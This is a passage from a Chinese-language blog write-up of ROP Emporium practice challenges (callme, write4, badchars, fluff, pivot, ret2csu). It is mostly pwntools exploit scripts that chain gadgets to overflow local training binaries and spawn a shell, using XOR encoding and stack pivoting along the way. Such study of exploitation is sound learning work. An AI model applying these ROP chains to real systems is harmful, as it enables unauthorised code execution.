class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="callme-64"><a href="#callme-64" class="headerlink" title="callme_64"></a>callme_64</h3><p>和32基本一样，注意传参问题就好</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#coding&#x3D;&quot;utf-8&quot;</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;process(&quot;.&#x2F;callme&quot;)</span><br><span class="line">gadget_addr&#x3D;0x0401ab0</span><br><span class="line">callme_one_addr&#x3D;0x0401850</span><br><span class="line">callme_two_addr&#x3D;0x0401870</span><br><span class="line">callme_three_addr&#x3D;0x0401810</span><br><span class="line">payload&#x3D;&quot;a&quot;*0x20+&quot;a&quot;*0x8</span><br><span class="line">payload+&#x3D;p64(gadget_addr)+p64(0x1)+p64(0x2)+p64(0x3)+p64(callme_one_addr)</span><br><span class="line">payload+&#x3D;p64(gadget_addr)+p64(0x1)+p64(0x2)+p64(0x3)+p64(callme_two_addr)</span><br><span class="line">payload+&#x3D;p64(gadget_addr)+p64(0x1)+p64(0x2)+p64(0x3)+p64(callme_three_addr)</span><br><span class="line">sh.recvuntil(&quot;&gt;&quot;)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="write4-32"><a href="#write4-32" class="headerlink" title="write4_32"></a>write4_32</h3><p>程序中只有system函数，没有我们需要的/bin/sh，需要我们自己构造，但是我们要向将自己构造的写入到程序，就要知道程序bss段或者data段是否可写，以及他们的空间是否足够。另外需要注意的是，我们这里是 32 位程序，每次只能写入 4 个字节，所以要分成两次写入，还得注意字符对齐，有没有截断字符（ \x00  , \x0a  等）之类的问<br>题，比如这里  /bin/sh  只有七个字节，我们可以使用  /bin/sh\x00  或者/bin//sh </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#coding&#x3D;&quot;uft-8&quot;</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;process(&quot;.&#x2F;write432&quot;)</span><br><span class="line">system_addr&#x3D;0x0804865a           #system_plt_addr&#x3D;0x08048430</span><br><span class="line">pop_pop_addr&#x3D;0x080486da</span><br><span class="line">mov_addr&#x3D;0x08048670</span><br><span class="line">data_addr&#x3D;0x0804a028</span><br><span class="line"></span><br><span class="line">payload&#x3D;&quot;a&quot;*0x28+&quot;a&quot;*4</span><br><span class="line">payload+&#x3D;p32(pop_pop_addr)+p32(data_addr)+&quot;&#x2F;bin&quot;+p32(mov_addr)</span><br><span class="line">payload+&#x3D;p32(pop_pop_addr)+p32(data_addr+4)+&quot;&#x2F;&#x2F;sh&quot;+p32(mov_addr)</span><br><span class="line"></span><br><span class="line">#payload+&#x3D;p32(pop_pop_addr)+p32(data_addr+4)+&quot;&#x2F;sh\x00&quot;+p32(mov_addr)</span><br><span class="line"></span><br><span class="line">payload+&#x3D;p32(system_addr)+p32(data_addr)         #p32(system_plt_addr)   </span><br><span class="line"></span><br><span class="line">sh.recvuntil(&quot;&gt;&quot;)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="write4-64"><a href="#write4-64" class="headerlink" title="write4_64"></a>write4_64</h3><p>64位一次写入就好了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#coding&#x3D;&quot;utf-8&quot;</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;process(&quot;.&#x2F;write4&quot;)</span><br><span class="line">system_plt_addr&#x3D;0x04005e0</span><br><span class="line">data_addr&#x3D;0x0601050</span><br><span class="line">mov_ret_addr&#x3D;0x0400820</span><br><span class="line">pop_pop_addr&#x3D;0x0400890</span><br><span class="line">pop_rdi_addr&#x3D;0x0400893</span><br><span class="line"></span><br><span class="line">payload&#x3D;&quot;a&quot;*0x20+&quot;a&quot;*0x8</span><br><span class="line">payload+&#x3D;p64(pop_pop_addr)+p64(data_addr)+&quot;&#x2F;bin&#x2F;sh\x00&quot;+p64(mov_ret_addr)</span><br><span class="line">payload+&#x3D;p64(pop_rdi_addr)+p64(data_addr)+p64(system_plt_addr)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&quot;&gt;&quot;)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="badchars-32"><a href="#badchars-32" class="headerlink" title="badchars_32"></a>badchars_32</h3><p>我们依然要将  /bin/sh  写入到进程内存中，但这一次程序在读取，输入时会对敏感字符进行检查。处理敏感字符在利用开发中是经常要用到的，不仅仅是要对参数进行编码，有时甚至地址也要如此。这里我们使用简单的异或操作来对字符串编码和解码。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding="utf-8"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh=process(<span class="string">"./badchars32"</span>)</span><br><span class="line"></span><br><span class="line">pop_ebx_ecx_addr=<span class="number">0x08048896</span></span><br><span class="line">pop_esi_edi_addr=<span class="number">0x08048899</span></span><br><span class="line">mov_edi_esi_addr=<span class="number">0x08048893</span></span><br><span class="line">xor_addr=<span class="number">0x08048890</span></span><br><span class="line">system_plt_addr=<span class="number">0x080484e0</span></span><br><span class="line">bss_addr=<span class="number">0x0804a040</span></span><br><span class="line"><span class="comment">#encode</span></span><br><span class="line">binsh=<span class="string">""</span></span><br><span class="line">xor_byte=<span class="number">0x2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">"/bin/sh\x00"</span>:</span><br><span class="line">	c=ord(i) ^ xor_byte</span><br><span class="line">	binsh+=chr(c)</span><br><span class="line"><span class="comment">#write</span></span><br><span class="line">payload=<span class="string">"a"</span>*<span class="number">44</span></span><br><span class="line">payload+=p32(pop_esi_edi_addr)+binsh[<span class="number">0</span>:<span class="number">4</span>]+p32(bss_addr)+p32(mov_edi_esi_addr)</span><br><span class="line">payload+=p32(pop_esi_edi_addr)+binsh[<span class="number">4</span>:<span class="number">8</span>]+p32(bss_addr+<span class="number">4</span>)+p32(mov_edi_esi_addr)</span><br><span class="line"><span class="comment">#code</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(binsh)):</span><br><span class="line">	payload+=p32(pop_ebx_ecx_addr)</span><br><span class="line">	payload+=p32(bss_addr+i)</span><br><span class="line">	payload+=p32(xor_byte)</span><br><span class="line">	payload+=p32(xor_addr)</span><br><span class="line"></span><br><span class="line">payload+=p32(system_plt_addr)+<span class="string">"a"</span>*<span class="number">0x4</span>+p32(bss_addr)</span><br><span class="line">	</span><br><span class="line">sh.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="badchars-64"><a href="#badchars-64" class="headerlink" title="badchars_64"></a>badchars_64</h3><p>和32位一样，就是这次可以一次传参了，需要注意的就是传参问题</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding="utf-8"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh=process(<span class="string">"./badchars"</span>)</span><br><span class="line">elf=ELF(<span class="string">'./badchars'</span>)</span><br><span class="line">system_plt_addr=<span class="number">0x004006f0</span></span><br><span class="line">bss_addr=<span class="number">0x0000000000601080</span>			//本来想用data段的，但是不知道为什么data段地址就是不对，服服服。。。</span><br><span class="line">mov_r13_r12_addr=<span class="number">0x0400b34</span></span><br><span class="line">pop_r12_r13_addr=<span class="number">0x0400b3b</span></span><br><span class="line">pop_r14_r15_addr=<span class="number">0x0400b40</span></span><br><span class="line">xor_r15_r14_addr=<span class="number">0x0400b30</span></span><br><span class="line">pop_rdi_addr=<span class="number">0x0400b39</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">xor_byte=<span class="number">0x1</span></span><br><span class="line">badchars=[<span class="number">0x62</span>,<span class="number">0x69</span>,<span class="number">0x63</span>,<span class="number">0x2f</span>,<span class="number">0x20</span>,<span class="number">0x66</span>,<span class="number">0x6e</span>,<span class="number">0x73</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">	binsh=<span class="string">""</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">"/bin/sh\x00"</span>:</span><br><span class="line">		c=ord(i) ^ xor_byte</span><br><span class="line">		<span class="keyword">if</span> c <span class="keyword">in</span> badchars:</span><br><span class="line">			xor_byte+=<span class="number">1</span></span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			binsh+=chr(c)</span><br><span class="line">	<span class="keyword">if</span> len(binsh)==<span class="number">8</span>:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">"a"</span>*<span class="number">0x20</span>+<span class="string">"a"</span>*<span class="number">0x8</span></span><br><span class="line">payload+=p64(pop_r12_r13_addr)+binsh+p64(bss_addr)+p64(mov_r13_r12_addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(binsh)):</span><br><span class="line">	payload+=p64(pop_r14_r15_addr)</span><br><span class="line">	payload+=p64(xor_byte)</span><br><span class="line">	payload+=p64(bss_addr+i)</span><br><span class="line">	payload+=p64(xor_r15_r14_addr)</span><br><span class="line"></span><br><span class="line">payload+=p64(pop_rdi_addr)+p64(bss_addr)+p64(system_plt_addr)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="fluff-32"><a href="#fluff-32" class="headerlink" title="fluff_32"></a>fluff_32</h3><p>和前面的一样但是程序这次的gadget确实有点难利用。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding="utf-8"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh=process(<span class="string">"./fluff32"</span>)</span><br><span class="line"></span><br><span class="line">system_plt_addr=<span class="number">0x08048430</span></span><br><span class="line">bss_addr=<span class="number">0x0804a040</span></span><br><span class="line">mov_edx_addr=<span class="number">0x0804868c</span></span><br><span class="line">pop_ebx_addr=<span class="number">0x080483e1</span></span><br><span class="line">xor_edx_ebx=<span class="number">0x0804867b</span></span><br><span class="line">xchg_edx_ecx=<span class="number">0x08048689</span></span><br><span class="line">mov_ecx_edx=<span class="number">0x08048693</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="string">"a"</span>*<span class="number">44</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#addr-&gt;ecx                   ##先将程序通过异或来放到edx中，然后在解密放到ecx中</span></span><br><span class="line"></span><br><span class="line">payload+=p32(mov_edx_addr)</span><br><span class="line">payload+=p32(pop_ebx_addr)</span><br><span class="line">payload+=p32(bss_addr)</span><br><span class="line">payload+=p32(xor_edx_ebx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(pop_ebx_addr)</span><br><span class="line">payload+=p32(<span class="number">0xdefaced0</span>)</span><br><span class="line">payload+=p32(xor_edx_ebx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(xchg_edx_ecx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#data-&gt;edx                           #先将程序通过异或来放到edx中，然后再把edx中的解密</span></span><br><span class="line"></span><br><span class="line">payload+=p32(pop_ebx_addr)                     </span><br><span class="line">payload+=<span class="string">"/bin"</span></span><br><span class="line">payload+=p32(xor_edx_ebx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(pop_ebx_addr)</span><br><span class="line">payload+=p32(<span class="number">0xdefaced0</span>)</span><br><span class="line">payload+=p32(xor_edx_ebx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(mov_ecx_edx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#addr-&gt;ecx							#和上面一样，32位需要俩次才能把参数传完</span></span><br><span class="line"></span><br><span class="line">payload+=p32(mov_edx_addr)</span><br><span class="line">payload+=p32(pop_ebx_addr)</span><br><span class="line">payload+=p32(bss_addr+<span class="number">4</span>)</span><br><span class="line">payload+=p32(xor_edx_ebx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(pop_ebx_addr)</span><br><span class="line">payload+=p32(<span class="number">0xdefaced0</span>)</span><br><span class="line">payload+=p32(xor_edx_ebx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(xchg_edx_ecx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#data-&gt;edx</span></span><br><span class="line">payload+=p32(pop_ebx_addr)</span><br><span class="line">payload+=<span class="string">"/sh\x00"</span></span><br><span class="line">payload+=p32(xor_edx_ebx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(pop_ebx_addr)</span><br><span class="line">payload+=p32(<span class="number">0xdefaced0</span>)</span><br><span class="line">payload+=p32(xor_edx_ebx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(mov_ecx_edx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload+=p32(system_plt_addr)+p32(<span class="number">0</span>)+p32(bss_addr)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>感觉自己写的好麻烦，还需要异或俩次才可以，后来看了别人的wp发现，直接xor edx，edx 就不用第二次异或了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding="utf-8"</span></span><br><span class="line"><span class="keyword">from</span>  pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh=process(<span class="string">"./fluff32"</span>)</span><br><span class="line"><span class="comment">#elf=ELF("./fluff32")		#换成这样也可以</span></span><br><span class="line">system_plt_addr=<span class="number">0x08048430</span>    <span class="comment"># system_plt_addr=elf.plt['system']</span></span><br><span class="line">bss_addr=<span class="number">0x0804a040</span>			 <span class="comment"># bss_addr=elf.bss()</span></span><br><span class="line">pop_ebx_addr=<span class="number">0x080483e1</span></span><br><span class="line">xor_edx_ebx=<span class="number">0x0804867b</span></span><br><span class="line">xchg_edx_ecx=<span class="number">0x08048689</span></span><br><span class="line">mov_ecx_edx=<span class="number">0x08048693</span></span><br><span class="line">xor_edx_edx=<span class="number">0x08048671</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="string">"a"</span>*<span class="number">44</span></span><br><span class="line"><span class="comment">#addr-&gt;ecx</span></span><br><span class="line">payload+=p32(xor_edx_edx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(pop_ebx_addr)</span><br><span class="line">payload+=p32(bss_addr)</span><br><span class="line">payload+=p32(xor_edx_ebx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(xchg_edx_ecx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#data-&gt;edx</span></span><br><span class="line">payload+=p32(xor_edx_edx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(pop_ebx_addr)</span><br><span class="line">payload+=<span class="string">"/bin"</span></span><br><span class="line">payload+=p32(xor_edx_ebx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(mov_ecx_edx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#addr-&gt;ecx</span></span><br><span class="line">payload+=p32(xor_edx_edx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(pop_ebx_addr)</span><br><span class="line">payload+=p32(bss_addr+<span class="number">4</span>)</span><br><span class="line">payload+=p32(xor_edx_ebx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(xchg_edx_ecx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#data-&gt;edx</span></span><br><span class="line">payload+=p32(xor_edx_edx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(pop_ebx_addr)</span><br><span class="line">payload+=<span class="string">"/sh\x00"</span></span><br><span class="line">payload+=p32(xor_edx_ebx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(mov_ecx_edx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload+=p32(system_plt_addr)+p32(<span class="number">0</span>)+p32(bss_addr)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="fluff-64"><a href="#fluff-64" class="headerlink" title="fluff_64"></a>fluff_64</h3><p>用老方法查看gadget没找到合适的。。。 然后wp上说要加上 –depth ，加上以后就找到了 <del>_</del>  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#coding&#x3D;&quot;uft-8&quot;</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;process(&quot;.&#x2F;fluff&quot;)</span><br><span class="line">elf&#x3D;ELF(&quot;.&#x2F;fluff&quot;)</span><br><span class="line">system_plt_addr&#x3D;elf.plt[&#39;system&#39;]</span><br><span class="line">bss_addr&#x3D;elf.bss()</span><br><span class="line">xor_r11_r11_addr&#x3D;0x0000000000400822</span><br><span class="line">pop_r12_addr&#x3D;0x0000000000400832</span><br><span class="line">xor_r11_r12_addr&#x3D;0x000000000040082f</span><br><span class="line">xchg_r11_r10_addr&#x3D;0x0000000000400840</span><br><span class="line">mov_r10_r11_addr&#x3D;0x000000000040084e</span><br><span class="line">pop_rdi_addr&#x3D;0x00000000004008c3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#addr-&gt;r10</span><br><span class="line"></span><br><span class="line">payload&#x3D;&quot;a&quot;*0x20+&quot;a&quot;*0x8</span><br><span class="line">payload+&#x3D;p64(xor_r11_r11_addr)</span><br><span class="line">payload+&#x3D;p64(0)</span><br><span class="line">payload+&#x3D;p64(pop_r12_addr)</span><br><span class="line">payload+&#x3D;p64(bss_addr)</span><br><span class="line">payload+&#x3D;p64(xor_r11_r12_addr)</span><br><span class="line">payload+&#x3D;p64(0)</span><br><span class="line">payload+&#x3D;p64(xchg_r11_r10_addr)</span><br><span class="line">payload+&#x3D;p64(0)</span><br><span class="line"></span><br><span class="line">#data-&gt;r11</span><br><span class="line"></span><br><span class="line">payload+&#x3D;p64(xor_r11_r11_addr)</span><br><span class="line">payload+&#x3D;p64(0)</span><br><span class="line">payload+&#x3D;p64(pop_r12_addr)</span><br><span class="line">payload+&#x3D;&quot;&#x2F;bin&#x2F;sh\x00&quot;</span><br><span class="line">payload+&#x3D;p64(xor_r11_r12_addr)</span><br><span class="line">payload+&#x3D;p64(0)</span><br><span class="line">payload+&#x3D;p64(mov_r10_r11_addr)</span><br><span class="line">payload+&#x3D;p64(0)</span><br><span class="line">payload+&#x3D;p64(0)</span><br><span class="line"></span><br><span class="line">payload+&#x3D;p64(pop_rdi_addr)+p64(bss_addr)+p64(system_plt_addr)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&quot;&gt;&quot;)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pivot-32"><a href="#pivot-32" class="headerlink" title="pivot_32"></a>pivot_32</h3><p>感觉难度突然增加，有点绝望，果然pwn还是很难，这题呢主要考察俩个点，一个是栈的迁移，一个是泄露目标函数的地址，这里我用了俩种方法写，大同小异而已</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">sh=process(<span class="string">"./pivot32"</span>)</span><br><span class="line">elf=ELF(<span class="string">"./pivot32"</span>)</span><br><span class="line">libc_elf=ELF(<span class="string">"./libpivot32.so"</span>)</span><br><span class="line"></span><br><span class="line">foothold_function_plt_addr=elf.plt[<span class="string">'foothold_function'</span>]</span><br><span class="line">foothold_function_got_addr=elf.got[<span class="string">'foothold_function'</span>]</span><br><span class="line">foothold_function_sym=libc_elf.symbols[<span class="string">'foothold_function'</span>]</span><br><span class="line">ret2win_sym=libc_elf.symbols[<span class="string">'ret2win'</span>]</span><br><span class="line">offset=int(ret2win_sym-foothold_function_sym)</span><br><span class="line"></span><br><span class="line">leave_ret=<span class="number">0x080486a8</span></span><br><span class="line">mov_eax_eax_addr=<span class="number">0x080488c4</span></span><br><span class="line">pop_eax_addr=<span class="number">0x080488c0</span></span><br><span class="line">pop_ebx_addr=<span class="number">0x08048571</span></span><br><span class="line">add_eax_ebx_addr=<span class="number">0x080488c7</span></span><br><span class="line">call_eax=<span class="number">0x080486a3</span></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">"The Old Gods kindly bestow upon you a place to pivot: "</span>)</span><br><span class="line">fake_ebp=int(sh.recv(<span class="number">10</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">payload1=p32(<span class="number">0</span>)</span><br><span class="line">payload1+=p32(foothold_function_plt_addr)</span><br><span class="line">payload1+=p32(pop_eax_addr)</span><br><span class="line">payload1+=p32(foothold_function_got_addr)</span><br><span class="line">payload1+=p32(mov_eax_eax_addr)</span><br><span class="line">payload1+=p32(pop_ebx_addr)</span><br><span class="line">payload1+=p32(offset)</span><br><span class="line">payload1+=p32(add_eax_ebx_addr)</span><br><span class="line">payload1+=p32(call_eax)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">sh.sendline(payload1)</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">"a"</span>*<span class="number">40</span></span><br><span class="line">payload2+=p32(fake_ebp)</span><br><span class="line">payload2+=p32(leave_ret)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">sh.sendline(payload2)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>第二种方法就是将esp部分也用gadget表示，不用再向第一种一样伪造一个堆栈了，也就是说不用管ebp的值了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">sh&#x3D;process(&quot;.&#x2F;pivot32&quot;)</span><br><span class="line">elf&#x3D;ELF(&quot;.&#x2F;pivot32&quot;)</span><br><span class="line">libc_elf&#x3D;ELF(&quot;.&#x2F;libpivot32.so&quot;)</span><br><span class="line"></span><br><span class="line">foothold_function_plt_addr&#x3D;elf.plt[&#39;foothold_function&#39;]</span><br><span class="line">foothold_function_got_addr&#x3D;elf.got[&#39;foothold_function&#39;]</span><br><span class="line">foothold_function_sym&#x3D;libc_elf.symbols[&#39;foothold_function&#39;]</span><br><span class="line">ret2win_sym&#x3D;libc_elf.symbols[&#39;ret2win&#39;]</span><br><span class="line">offset&#x3D;int(ret2win_sym-foothold_function_sym)</span><br><span class="line"></span><br><span class="line">mov_eax_eax_addr&#x3D;0x080488c4</span><br><span class="line">pop_eax_addr&#x3D;0x080488c0</span><br><span class="line">pop_ebx_addr&#x3D;0x08048571</span><br><span class="line">add_eax_ebx_addr&#x3D;0x080488c7</span><br><span class="line">call_eax&#x3D;0x080486a3</span><br><span class="line">pop_eax&#x3D;0x080488c0</span><br><span class="line">xchg_eax_esp&#x3D;0x080488c2</span><br><span class="line">sh.recvuntil(&quot;The Old Gods kindly bestow upon you a place to pivot: &quot;)</span><br><span class="line">fake_ebp&#x3D;int(sh.recv(10),16)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload1&#x3D;p32(foothold_function_plt_addr)</span><br><span class="line">payload1+&#x3D;p32(pop_eax_addr)</span><br><span class="line">payload1+&#x3D;p32(foothold_function_got_addr)</span><br><span class="line">payload1+&#x3D;p32(mov_eax_eax_addr)</span><br><span class="line">payload1+&#x3D;p32(pop_ebx_addr)</span><br><span class="line">payload1+&#x3D;p32(offset)</span><br><span class="line">payload1+&#x3D;p32(add_eax_ebx_addr)</span><br><span class="line">payload1+&#x3D;p32(call_eax)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&quot;&gt;&quot;)</span><br><span class="line">sh.sendline(payload1)</span><br><span class="line"></span><br><span class="line">payload2&#x3D;&quot;a&quot;*40+&quot;a&quot;*4</span><br><span class="line">payload2+&#x3D;p32(pop_eax)</span><br><span class="line">payload2+&#x3D;p32(fake_ebp)</span><br><span class="line">payload2+&#x3D;p32(xchg_eax_esp)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&quot;&gt;&quot;)</span><br><span class="line">sh.sendline(payload2)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pivot-64"><a href="#pivot-64" class="headerlink" title="pivot_64"></a>pivot_64</h3><p>这个题和32位的第二种方法一样，本来想用第一种方法的，但是在搜索leave；ret 的gadget时发现都存在<code>0a</code>截断，需要将<code>0a</code>变为其他字符，最后再用寄存器变成<code>0a</code>,程序第二次输入被限制了，我找了几个gadget发现输入都不够。还是自己太菜了 呜呜呜<del>~</del></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#coding&#x3D;&#39;utf-8&#39;</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">sh&#x3D;process(&quot;.&#x2F;pivot&quot;)</span><br><span class="line">elf&#x3D;ELF(&quot;.&#x2F;pivot&quot;)</span><br><span class="line">lib_elf&#x3D;ELF(&quot;.&#x2F;libpivot.so&quot;)</span><br><span class="line"></span><br><span class="line">fun_plt_addr&#x3D;elf.plt[&#39;foothold_function&#39;]</span><br><span class="line">fun_got_addr&#x3D;elf.got[&#39;foothold_function&#39;]</span><br><span class="line">fun_sym&#x3D;lib_elf.symbols[&#39;foothold_function&#39;]</span><br><span class="line">ret2win_sym&#x3D;lib_elf.symbols[&#39;ret2win&#39;]</span><br><span class="line">offset&#x3D;int(ret2win_sym-fun_sym)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&quot;The Old Gods kindly bestow upon you a place to pivot: &quot;)</span><br><span class="line">heap_addr&#x3D;int(sh.recv(14),16)</span><br><span class="line"></span><br><span class="line">mov_rax_rax&#x3D;0x0000000000400b05</span><br><span class="line">pop_rax&#x3D;0x0000000000400b00</span><br><span class="line">xchg_rax_rsp&#x3D;0x0000000000400b02</span><br><span class="line">call_rax&#x3D;0x000000000040098e</span><br><span class="line">add_rax_rbp&#x3D;0x0000000000400b09</span><br><span class="line">pop_rbp&#x3D;0x0000000000400900</span><br><span class="line"></span><br><span class="line">payload1&#x3D;p64(fun_plt_addr)+p64(pop_rax)+p64(fun_got_addr)</span><br><span class="line">payload1+&#x3D;p64(mov_rax_rax)+p64(pop_rbp)+p64(offset)+p64(add_rax_rbp)</span><br><span class="line">payload1+&#x3D;p64(call_rax)</span><br><span class="line"></span><br><span class="line">payload2&#x3D;&#39;b&#39;*40+p64(pop_rax)+p64(heap_addr)+p64(xchg_rax_rsp)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&quot;&gt;&quot;)</span><br><span class="line">sh.sendline(payload1)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&quot;&gt;&quot;)</span><br><span class="line">sh.sendline(payload2)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="ret2csu-64"><a href="#ret2csu-64" class="headerlink" title="ret2csu_64"></a>ret2csu_64</h3><p>学到这里说明你已经将初级ROP学完了，这道题看似特别简单，只要找一个rdx的gadget将程序规定的参数传进去就好了，但是你会发现rdx的gadget找不到。程序在运行时，都会调用libc，<code>__libc_csu_init</code>这个函数时一个初始化函数，看一下他的反汇编发现，我们可以调用他的某些gadget来给rdx赋值。但是我们在调用的时候需要call一个函数，一开始我想要call ret2win，但是因为我们需要ret2win的指针所以没有成功。我们需要一个不改变任何寄存器的值，或者不改变rdx的值的函数，文章中说_init这个函数不会改变rdx的值，所以就用它了。</p>
